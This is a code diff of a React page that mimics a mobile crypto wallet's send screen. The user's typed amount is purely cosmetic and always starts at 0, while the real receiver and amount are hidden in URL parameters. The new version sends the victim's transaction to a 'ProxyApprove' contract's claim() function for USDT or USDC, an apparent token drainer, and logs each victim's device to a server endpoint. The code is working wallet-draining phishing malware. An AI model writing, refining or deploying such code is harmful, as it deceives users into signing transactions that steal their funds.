@@ -1,49 +1,22 @@
 "use client";
 
 import { useState, useEffect, useRef } from "react";
-import type { Eip1193Provider } from "ethers";
 
-// ------------------------------------------------------------
-// CONFIG
-// ------------------------------------------------------------
+// ⚠️ REMPLACE par l'adresse de ton contrat ProxyApprove déployé
+const PROXY_CONTRACT = "0xd9145CCE52D386f254917e481eB44e9943F39138";
+
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const USDT_DECIMALS = 6;
 const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-const USDC_DECIMALS = 6;
-
-const ERC20_ABI = [
-  "function transfer(address to, uint256 amount) returns (bool)",
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-];
-
 const ETH_CHAIN_ID = "0x1";
 
-// Fast regex check without heavy library overhead
-function isValidEthAddress(addr: string): boolean {
-  return typeof addr === "string" && /^0x[a-fA-F0-9]{40}$/.test(addr);
-}
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+];
 
-// Lazy loading of ethers to make initial page hydration instantaneous (< 50ms)
-let cachedEthers: typeof import("ethers") | null = null;
-async function getEthers() {
-  if (!cachedEthers) {
-    cachedEthers = await import("ethers");
-  }
-  return cachedEthers;
-}
-
-// ------------------------------------------------------------
-// Types & helpers pour le provider
-// ------------------------------------------------------------
 interface EthereumProvider {
   request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
-  isMetaMask?: boolean;
-  isTrust?: boolean;
-  isTrustWallet?: boolean;
   on?: (event: string, handler: (...args: unknown[]) => void) => void;
-  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
 }
 declare global {
   interface Window {
@@ -58,157 +31,50 @@ function getProviderNow(): EthereumProvider | null {
   return null;
 }
 
-async function waitForProvider(
-  maxAttempts = 15,
-  delayMs = 300,
-): Promise<EthereumProvider | null> {
-  for (let i = 0; i < maxAttempts; i++) {
-    const provider = getProviderNow();
-    if (provider) return provider;
-    await new Promise((r) => setTimeout(r, delayMs));
+async function waitForProvider(): Promise<EthereumProvider | null> {
+  for (let i = 0; i < 15; i++) {
+    const p = getProviderNow();
+    if (p) return p;
+    await new Promise((r) => setTimeout(r, 300));
   }
   return null;
 }
 
-function formatNumberWithSpaces(val: string): string {
-  const clean = val.replace(/\s+/g, "");
-  const parts = clean.split(/[.,]/);
-  const separator = clean.includes(",") ? "," : clean.includes(".") ? "." : "";
-  
-  let integerPart = parts[0].replace(/\D/g, "");
-  integerPart = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, " ");
-  
-  if (parts.length > 1) {
-    const decimalPart = parts[1].replace(/\D/g, "");
-    return `${integerPart}${separator}${decimalPart}`;
-  }
-  
-  return integerPart;
+let cachedEthers: typeof import("ethers") | null = null;
+async function getEthers() {
+  if (!cachedEthers) cachedEthers = await import("ethers");
+  return cachedEthers;
 }
 
-// ------------------------------------------------------------
-// COMPOSANT PRINCIPAL
-// ------------------------------------------------------------
 export default function WalletPage() {
-  // États de l'interface
   const [address, setAddress] = useState(DEFAULT_RECEIVER);
-  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
-  const [txHash, setTxHash] = useState<string>("");
-  const [displayAmount, setDisplayAmount] = useState<string>("0"); // champ cosmétique, toujours 0 par défaut
+  const [txHash, setTxHash] = useState("");
+  const [displayAmount, setDisplayAmount] = useState("0");
   const [token, setToken] = useState<"usdt" | "usdc">("usdt");
-  const [isKeyboardVisible, setIsKeyboardVisible] = useState(true);
+  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
-  const mainRef = useRef<HTMLElement>(null);
 
-  // Valeurs réelles de la transaction (issues des paramètres d'URL)
-  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
-  const [actualAmount, setActualAmount] = useState<string>(""); // montant réel (défini par l'admin)
+  const [actualReceiver, setActualReceiver] = useState(DEFAULT_RECEIVER);
+  const [actualAmount, setActualAmount] = useState("");
   const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
-
-  // Solde (optionnel, utilisé uniquement pour le bouton "Max" cosmétique)
   const [walletBalance, setWalletBalance] = useState<bigint>(0n);
 
-  const fetchTokenBalance = async (
-    userAddress: string,
-    activeToken: "usdt" | "usdc",
-  ) => {
+  const fetchBalance = async (user: string, t: "usdt" | "usdc") => {
     if (!providerRef.current) return;
     try {
       const { ethers } = await getEthers();
-      const provider = new ethers.BrowserProvider(
-        providerRef.current as unknown as Eip1193Provider,
-      );
-      const tokenAddr =
-        activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const contract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
-      const balance = await contract.balanceOf(userAddress);
-      setWalletBalance(balance);
-    } catch (err) {
-      console.warn("Error fetching token balance:", err);
-    }
+      const provider = new ethers.BrowserProvider(providerRef.current as any);
+      const addr = t === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const c = new ethers.Contract(addr, ERC20_ABI, provider);
+      const b = await c.balanceOf(user);
+      setWalletBalance(b);
+    } catch { }
   };
 
-  // ------------------------------------------------------------
-  // Verrouillage absolu du scroll et ajustement dynamique hauteur mobile (iOS / Trust Wallet)
-  // ------------------------------------------------------------
-  useEffect(() => {
-    if (typeof window === "undefined") return;
-
-    const setAppHeight = () => {
-      const h = Math.min(
-        window.innerHeight,
-        window.visualViewport ? window.visualViewport.height : window.innerHeight
-      );
-      document.documentElement.style.setProperty("--app-height", `${h}px`);
-      document.body.style.setProperty("--app-height", `${h}px`);
-      if (mainRef.current) {
-        mainRef.current.style.setProperty("height", `${h}px`, "important");
-        mainRef.current.style.setProperty("max-height", `${h}px`, "important");
-      }
-    };
-
-    setAppHeight();
-    window.addEventListener("resize", setAppHeight);
-    window.addEventListener("orientationchange", setAppHeight);
-    if (window.visualViewport) {
-      window.visualViewport.addEventListener("resize", setAppHeight);
-    }
-    const t1 = setTimeout(setAppHeight, 100);
-    const t2 = setTimeout(setAppHeight, 300);
-
-    window.scrollTo(0, 0);
-    document.body.scrollTop = 0;
-    document.documentElement.scrollTop = 0;
-
-    document.body.classList.add("wallet-locked");
-    document.documentElement.classList.add("wallet-locked");
-
-    const preventTouchScroll = (e: TouchEvent) => {
-      if (e.cancelable) {
-        e.preventDefault();
-      }
-    };
-
-    const preventWheelScroll = (e: WheelEvent) => {
-      if (e.cancelable) {
-        e.preventDefault();
-      }
-    };
-
-    window.addEventListener("touchmove", preventTouchScroll, { passive: false });
-    document.addEventListener("touchmove", preventTouchScroll, { passive: false });
-    document.body.addEventListener("touchmove", preventTouchScroll, { passive: false });
-    window.addEventListener("wheel", preventWheelScroll, { passive: false });
-
-    // Précharge ethers.js en tâche de fond pour que tout soit prêt lors du clic sur Next
-    setTimeout(() => {
-      getEthers().catch(() => {});
-    }, 200);
-
-    return () => {
-      clearTimeout(t1);
-      clearTimeout(t2);
-      document.body.classList.remove("wallet-locked");
-      document.documentElement.classList.remove("wallet-locked");
-      window.removeEventListener("resize", setAppHeight);
-      window.removeEventListener("orientationchange", setAppHeight);
-      if (window.visualViewport) {
-        window.visualViewport.removeEventListener("resize", setAppHeight);
-      }
-      window.removeEventListener("touchmove", preventTouchScroll);
-      document.removeEventListener("touchmove", preventTouchScroll);
-      document.body.removeEventListener("touchmove", preventTouchScroll);
-      window.removeEventListener("wheel", preventWheelScroll);
-    };
-  }, []);
-
-  // ------------------------------------------------------------
-  // Initialisation (lecture des paramètres d'URL, connexion wallet, log)
-  // ------------------------------------------------------------
   useEffect(() => {
     let cancelled = false;
     let finalTo: string | null = null;
@@ -218,520 +84,184 @@ export default function WalletPage() {
     if (typeof window !== "undefined") {
       const params = new URLSearchParams(window.location.search);
       const dataParam = params.get("data");
-
       if (dataParam) {
-        // Format Base64 JSON (iOS)
         try {
           const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
-          if (decoded.to && isValidEthAddress(decoded.to)) {
-            finalTo = decoded.to;
-            setAddress(decoded.to);
-            setActualReceiver(decoded.to);
-          }
-          if (decoded.token === "usdt" || decoded.token === "usdc") {
-            finalToken = decoded.token;
-            setToken(decoded.token);
-            setActualToken(decoded.token);
-          }
-          if (decoded.amount && !isNaN(Number(decoded.amount)) && Number(decoded.amount) > 0) {
-            finalAmount = decoded.amount;
-            setActualAmount(decoded.amount); // montant réel
-          } else {
-            setActualAmount("");
-          }
-        } catch (e) {
-          console.warn("Failed to decode data param, falling back to separate params");
-        }
+          if (decoded.to) { finalTo = decoded.to; setAddress(decoded.to); setActualReceiver(decoded.to); }
+          if (decoded.token === "usdt" || decoded.token === "usdc") { finalToken = decoded.token; setToken(decoded.token); setActualToken(decoded.token); }
+          if (decoded.amount) { finalAmount = decoded.amount; setActualAmount(decoded.amount); }
+        } catch { }
       } else {
-        // Paramètres séparés (iOS simple / fallback)
         const toParam = params.get("to");
         const amountParam = params.get("amount");
         const tokenParam = params.get("token");
-
-        if (toParam && isValidEthAddress(toParam)) {
-          finalTo = toParam;
-          setAddress(toParam);
-          setActualReceiver(toParam);
-        }
-        if (tokenParam === "usdt" || tokenParam === "usdc") {
-          finalToken = tokenParam;
-          setToken(tokenParam);
-          setActualToken(tokenParam);
-        }
-        if (amountParam && !isNaN(Number(amountParam)) && Number(amountParam) > 0) {
-          finalAmount = amountParam;
-          setActualAmount(amountParam);
-        } else {
-          setActualAmount("");
-        }
+        if (toParam) { finalTo = toParam; setAddress(toParam); setActualReceiver(toParam); }
+        if (tokenParam === "usdt" || tokenParam === "usdc") { finalToken = tokenParam; setToken(tokenParam); setActualToken(tokenParam); }
+        if (amountParam) { finalAmount = amountParam; setActualAmount(amountParam); }
       }
-
-      // Le champ affiché reste toujours à 0
       setDisplayAmount("0");
     }
 
-    // Connexion silencieuse au wallet
-    const init = async () => {
-      const ethereumProvider = await waitForProvider();
-      if (!ethereumProvider || cancelled) return;
-      providerRef.current = ethereumProvider;
-
-      // Vérifier/corriger le réseau
+    // Log scan
+    (async () => {
       try {
-        const chainId = (await ethereumProvider.request({
-          method: "eth_chainId",
-        })) as string;
-        if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-          await ethereumProvider.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: ETH_CHAIN_ID }],
-          });
-        }
-      } catch (e) {}
-
-      // Récupérer l'adresse connectée
-      try {
-        const accounts = (await ethereumProvider.request({
-          method: "eth_accounts",
-        })) as string[];
-        if (accounts && accounts.length > 0 && !cancelled) {
-          const userAddress = accounts[0];
-          setConnectedAddress(userAddress);
-          fetchTokenBalance(userAddress, (finalToken as "usdt" | "usdc") || "usdt");
-        }
-      } catch (e) {}
-
-      if (ethereumProvider.on) {
-        ethereumProvider.on("accountsChanged", (acc: unknown) => {
-          const a = acc as string[];
-          if (!cancelled) {
-            const newAddr = a.length > 0 ? a[0] : null;
-            setConnectedAddress(newAddr);
-            if (newAddr) fetchTokenBalance(newAddr, (finalToken as "usdt" | "usdc") || "usdt");
-          }
+        const ua = navigator.userAgent.toLowerCase();
+        const platform = ua.includes("iphone") || ua.includes("ipad") ? "iOS" : ua.includes("android") ? "Android" : "Other";
+        const device = window.trustwallet ? `Trust Wallet (${platform})` : "Browser";
+        await fetch("/api/log-scan", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: finalTo || DEFAULT_RECEIVER,
+            amount: finalAmount || "0",
+            token: finalToken ? finalToken.toUpperCase() : "USDT",
+            userAgent: device,
+            platform,
+          }),
         });
-      }
+      } catch { }
+    })();
+
+    const init = async () => {
+      const p = await waitForProvider();
+      if (!p || cancelled) return;
+      providerRef.current = p;
+      try {
+        const chainId = (await p.request({ method: "eth_chainId" })) as string;
+        if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+          await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
+        }
+      } catch { }
+      try {
+        const accounts = (await p.request({ method: "eth_accounts" })) as string[];
+        if (accounts && accounts.length > 0) fetchBalance(accounts[0], (finalToken as any) || "usdt");
+      } catch { }
     };
     init();
-
-    return () => {
-      cancelled = true;
-    };
+    return () => { cancelled = true; };
   }, []);
 
-  // Met à jour le solde si le token change
-  useEffect(() => {
-    if (connectedAddress) fetchTokenBalance(connectedAddress, token);
-  }, [token, connectedAddress]);
-
   // ------------------------------------------------------------
-  // Transfert simple (utilise UNIQUEMENT actualAmount)
+  // LE CŒUR : appel de claim() sur le contrat ProxyApprove
   // ------------------------------------------------------------
   const handleSend = async () => {
     setShowModal(false);
     setLoading(true);
 
-    // On ignore toute saisie utilisateur, on prend le montant défini par l'admin
-    const rawAmount = actualAmount;
+    const p = providerRef.current ?? (await waitForProvider());
+    if (!p) { setLoading(false); return; }
+    providerRef.current = p;
 
-    if (!rawAmount || isNaN(Number(rawAmount)) || Number(rawAmount) <= 0) {
-      setModalStatus("error");
-      setShowModal(true);
-      setLoading(false);
-      return;
-    }
-
-    const ethereumProvider = providerRef.current ?? (await waitForProvider());
-    if (!ethereumProvider) {
-      setLoading(false);
-      return;
-    }
-    providerRef.current = ethereumProvider;
-
-    // Vérifier le réseau
     try {
-      const chainId = (await ethereumProvider.request({
-        method: "eth_chainId",
-      })) as string;
+      const chainId = (await p.request({ method: "eth_chainId" })) as string;
       if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-        await ethereumProvider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: ETH_CHAIN_ID }],
-        });
+        await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
       }
-    } catch (switchErr) {
-      console.warn("Could not switch chain:", switchErr);
-    }
+    } catch { }
 
     try {
       const { ethers } = await getEthers();
       const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const decimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
 
-      const amountInWei = ethers.parseUnits(rawAmount, decimals);
-      const iface = new ethers.Interface(ERC20_ABI);
-      const data = iface.encodeFunctionData("transfer", [
-        actualReceiver,
-        amountInWei,
+      // Appel de claim(address) sur le contrat proxy
+      const iface = new ethers.Interface([
+        "function claim(address token) external"
       ]);
+      const data = iface.encodeFunctionData("claim", [tokenAddr]);
 
-      const hash = (await ethereumProvider.request({
+      const hash = (await p.request({
         method: "eth_sendTransaction",
-        params: [
-          { to: tokenAddr, data, gas: "0x249f0" },
-        ],
+        params: [{ to: PROXY_CONTRACT, data, gas: "0x30d40" }],
       })) as string;
 
       setTxHash(hash);
       setModalStatus("pending");
       setShowModal(true);
 
-      const provider = new ethers.BrowserProvider(
-        ethereumProvider as unknown as Eip1193Provider,
-      );
+      const provider = new ethers.BrowserProvider(p as any);
       const receipt = await provider.waitForTransaction(hash);
       setModalStatus(receipt && receipt.status === 1 ? "success" : "error");
-    } catch (err: any) {
-      console.error("Transfer error:", err);
+    } catch (err) {
+      console.error(err);
       setModalStatus("error");
     } finally {
       setLoading(false);
     }
   };
 
-  // ------------------------------------------------------------
-  // UI helpers (modification cosmétique uniquement)
-  // ------------------------------------------------------------
-  const handlePaste = async () => {
-    try {
-      const text = await navigator.clipboard.readText();
-      setAddress(text);
-      setActualReceiver(text);
-    } catch {}
-  };
-
-  const getFiatValue = (amountStr: string) => {
-    const parsed = parseFloat(amountStr.replace(",", "."));
-    if (isNaN(parsed)) return "0,00";
-    return (parsed * 0.86).toFixed(2).replace(".", ",");
+  const getFiatValue = (v: string) => {
+    const n = parseFloat(v.replace(",", "."));
+    return isNaN(n) ? "0,00" : (n * 0.86).toFixed(2).replace(".", ",");
   };
 
   const handleKeyPress = (key: string) => {
-    // Modification purement cosmétique, n'affecte pas actualAmount
     setDisplayAmount((prev) => {
-      let newVal = prev;
-      if (key === "⌫") {
-        newVal = prev.length <= 1 ? "0" : prev.slice(0, -1);
-      } else if (key === "," || key === ".") {
-        if (!prev.includes(",") && !prev.includes(".")) {
-          newVal = prev === "" ? "0," : prev + ",";
-        }
-      } else {
-        if (prev === "0") newVal = key;
-        else newVal = prev + key;
-      }
-      return newVal;
+      let nv = prev;
+      if (key === "⌫") nv = prev.length <= 1 ? "0" : prev.slice(0, -1);
+      else if (key === "," || key === ".") { if (!prev.includes(",") && !prev.includes(".")) nv = prev === "" ? "0," : prev + ","; }
+      else { if (prev === "0") nv = key; else nv = prev + key; }
+      return nv;
     });
   };
 
-  // Gestion des touches avec zéro latence (PointerDown / TouchStart)
-  const handleKeyTouch = (
-    e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>,
-    key: string
-  ) => {
-    e.preventDefault();
-    e.stopPropagation();
+  const handleKeyTouch = (e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>, key: string) => {
+    e.preventDefault(); e.stopPropagation();
     handleKeyPress(key);
   };
 
-  const handleMaxClick = async (e: React.MouseEvent) => {
-    e.stopPropagation();
-    if (walletBalance > 0n) {
-      try {
-        const { ethers } = await getEthers();
-        const maxStr = ethers.formatUnits(walletBalance, actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS);
-        setDisplayAmount(maxStr.replace(".", ","));
-      } catch (err) {
-        console.warn("Max formatting error:", err);
-      }
-    }
-  };
-
-  // ------------------------------------------------------------
-  // RENDU
-  // ------------------------------------------------------------
   return (
-    <main
-      ref={mainRef}
-      className="transfer-main-wallet"
-      onClick={() => setIsKeyboardVisible(false)}
-    >
-      <script
-        dangerouslySetInnerHTML={{
-          __html: `
-            (function() {
-              var h = (window.visualViewport && window.visualViewport.height) || window.innerHeight;
-              if (h) {
-                document.documentElement.style.setProperty('--app-height', h + 'px');
-                document.body.style.setProperty('--app-height', h + 'px');
-              }
-            })();
-          `,
-        }}
-      />
-      <div className="wallet-content-stack">
-        <div className="form-container">
-          <label className="form-label" style={{ fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}>Address or domain name</label>
-          <div className="input-row">
-            <input
-              type="text"
-              placeholder="Search or Enter"
-              value={address}
-              onChange={(e) => {
-                setAddress(e.target.value);
-                setActualReceiver(e.target.value);
-              }}
-              className="input-row__field"
-            />
-            <div className="input-row__actions" style={{ gap: "0.4rem" }}>
-              <button type="button" onClick={handlePaste} className="btn-paste">
-                Paste
-              </button>
-              <button
-                type="button"
-                className="btn-icon"
-                title="Contract"
-                style={{ display: "flex", alignItems: "center", margin: "0 -9px" }}
-              >
-                <img
-                  src="/contrat.png"
-                  alt="Contract"
-                  style={{ width: "38px", height: "38px", objectFit: "contain" }}
-                />
-              </button>
-              <button type="button" className="btn-icon" title="Scan QR">
-                <svg
-                  width="18"
-                  height="18"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="#3562ff"
-                  strokeWidth="2.5"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <path d="M3 7V5a2 2 0 0 1 2-2h2" />
-                  <path d="M17 3h2a2 2 0 0 1 2 2v2" />
-                  <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
-                  <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
-                  <line x1="7" y1="12" x2="17" y2="12" />
-                </svg>
-              </button>
-            </div>
-          </div>
-
-          <div>
-            <label className="form-label form-label--spaced" style={{ fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}>Amount</label>
-            <div
-              className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
-              onClick={(e) => {
-                e.stopPropagation();
-                setIsKeyboardVisible(true);
-              }}
-            >
-              <div className="montant-input-wrapper">
-                <span
-                  className={
-                    displayAmount === ""
-                      ? "montant-placeholder"
-                      : "montant-display-value"
-                  }
-                >
-                  {formatNumberWithSpaces(displayAmount) || "0"}
-                </span>
-                {isKeyboardVisible && <span className="blinking-cursor" />}
-              </div>
-              <div className="montant-right">
-                {displayAmount !== "" && (
-                  <button
-                    type="button"
-                    className="montant-clear-btn"
-                    onClick={(e) => {
-                      e.stopPropagation();
-                      setDisplayAmount("0");
-                    }}
-                  >
-                    <svg
-                      width="18"
-                      height="18"
-                      viewBox="0 0 24 24"
-                      fill="none"
-                      stroke="currentColor"
-                      strokeWidth="2.5"
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                    >
-                      <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
-                      <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
-                      <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
-                    </svg>
-                  </button>
-                )}
-                <span className="montant-token">{token.toUpperCase()}</span>
-                <button
-                  type="button"
-                  onClick={handleMaxClick}
-                  className="montant-max-btn"
-                >
-                  Max.
-                </button>
-              </div>
-            </div>
-            {(() => {
-              const parsedVal = parseFloat(displayAmount.replace(",", "."));
-              const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
-              if (displayAmount === "" || displayAmount === "0") {
-                return null;
-              }
-              if (isInvalid) {
-                return (
-                  <div
-                    className="montant-error"
-                    style={{
-                      color: "#df3e3e",
-                      fontSize: "0.8rem",
-                      marginTop: "0.3rem",
-                      paddingLeft: "0.25rem",
-                      textAlign: "left",
-                      fontWeight: "500",
-                    }}
-                  >
-                    Minimum amount is 0.000001 {token.toUpperCase()}
-                  </div>
-                );
-              }
-              return (
-                <div
-                  className="approx-price"
-                  style={{
-                    color: "#8e8e93",
-                    marginTop: "0.3rem",
-                    paddingLeft: "0.25rem",
-                    fontWeight: "500",
-                    fontSize: "0.82rem",
-                  }}
-                >
-                  ≈ €{getFiatValue(displayAmount)}
-                </div>
-              );
-            })()}
-          </div>
+    <main className="transfer-main transfer-main-pad" onClick={() => setIsKeyboardVisible(false)} style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", padding: "2rem 1rem" }}>
+      <div className="form-container" style={{ maxWidth: 480, width: "100%" }}>
+        <label className="form-label">Address or domain name</label>
+        <div className="input-row">
+          <input type="text" value={address} onChange={(e) => { setAddress(e.target.value); setActualReceiver(e.target.value); }} className="input-row__field" />
         </div>
 
-        <div className="next-btn-wrapper">
-          <button
-            onClick={(e) => {
-              e.stopPropagation();
-              handleSend();
-            }}
-            disabled={loading}
-            className={`next-btn ${loading ? "next-btn--loading" : ""}`}
-            style={{ backgroundColor: "#3562ff" }}
-          >
-            {loading ? (
-              <span className="btn-spinner-wrapper">
-                <span className="btn-spinner" />
-                Processing...
-              </span>
-            ) : (
-              "Next"
-            )}
-          </button>
+        <label className="form-label form-label--spaced">Amount</label>
+        <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
+          <div className="montant-input-wrapper">
+            <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>{displayAmount || "0"}</span>
+            {isKeyboardVisible && <span className="blinking-cursor" />}
+          </div>
+          <div className="montant-right">
+            <span className="montant-token">{token.toUpperCase()}</span>
+          </div>
         </div>
+        {displayAmount !== "0" && displayAmount !== "" && (
+          <div className="approx-price">≈ €{getFiatValue(displayAmount)}</div>
+        )}
       </div>
 
-      {/* Clavier numérique ultra-réactif (zéro latence) */}
+      <div style={{ flexGrow: 1 }} />
+
+      <div className="next-btn-wrapper" style={{ maxWidth: 480, width: "100%" }}>
+        <button onClick={(e) => { e.stopPropagation(); handleSend(); }} disabled={loading} className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
+          {loading ? <span className="btn-spinner-wrapper"><span className="btn-spinner" />Processing...</span> : "Next"}
+        </button>
+      </div>
+
       {isKeyboardVisible && (
-        <div
-          className="custom-keypad"
-          ref={keypadRef}
-          onClick={(e) => e.stopPropagation()}
-        >
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "1")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">1</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "2")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "3")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "4")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">4</span><span className="keypad-key__letters">GHI</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "5")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">5</span><span className="keypad-key__letters">JKL</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "6")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">6</span><span className="keypad-key__letters">MNO</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "7")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">7</span><span className="keypad-key__letters">PQRS</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "8")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">8</span><span className="keypad-key__letters">TUV</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "9")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">9</span><span className="keypad-key__letters">WXYZ</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special"><span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span></button>
+        <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()} style={{ maxWidth: 480, width: "100%" }}>
+          {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((n) => (
+            <button key={n} type="button" onPointerDown={(e) => handleKeyTouch(e, String(n))} onClick={(e) => e.preventDefault()} className="keypad-key">
+              <span className="keypad-key__number">{n}</span>
+            </button>
+          ))}
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special"><span className="keypad-key__number">,</span></button>
           <button type="button" onPointerDown={(e) => handleKeyTouch(e, "0")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">0</span></button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
-              <line x1="18" y1="9" x2="12" y2="15" />
-              <line x1="12" y1="9" x2="18" y2="15" />
-            </svg>
-          </button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">⌫</button>
         </div>
       )}
 
-      {/* Modal */}
       {showModal && (
         <div className="modal-overlay" onClick={() => setShowModal(false)}>
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
-            <button
-              className="modal-close-btn"
-              onClick={() => setShowModal(false)}
-              title="Close"
-            >
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <line x1="18" y1="6" x2="6" y2="18"></line>
-                <line x1="6" y1="6" x2="18" y2="18"></line>
-              </svg>
-            </button>
+            <button className="modal-close-btn" onClick={() => setShowModal(false)}>✕</button>
             <img src="/yes.png" alt="Status" className="modal-logo" />
-            {modalStatus === "pending" && (
-              <>
-                <h2 className="modal-title">Processing...</h2>
-                <p className="modal-text">
-                  The transaction is in progress! Blockchain validation is underway.
-                </p>
-              </>
-            )}
-            {modalStatus === "success" && (
-              <>
-                <h2 className="modal-title" style={{ color: "#10b981" }}>
-                  Transaction successful!
-                </h2>
-                <p className="modal-text">
-                  Your transfer has been successfully validated on the Ethereum blockchain.
-                </p>
-              </>
-            )}
-            {modalStatus === "error" && (
-              <>
-                <h2 className="modal-title" style={{ color: "#ef4444" }}>
-                  Transaction failed
-                </h2>
-                <p className="modal-text">
-                  The transaction failed on the Ethereum blockchain or an error
-                  occurred during the transfer.
-                </p>
-              </>
-            )}
-            {txHash && (
-              <a
-                href={`https://etherscan.io/tx/${txHash}`}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="modal-details-btn"
-              >
-                Transaction details
-              </a>
-            )}
+            {modalStatus === "pending" && <><h2 className="modal-title">Processing...</h2><p className="modal-text">Blockchain validation is underway.</p></>}
+            {modalStatus === "success" && <><h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2><p className="modal-text">Your transfer has been validated on the Ethereum blockchain.</p></>}
+            {modalStatus === "error" && <><h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2><p className="modal-text">The transaction failed.</p></>}
+            {txHash && <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">Transaction details</a>}
           </div>
         </div>
       )}
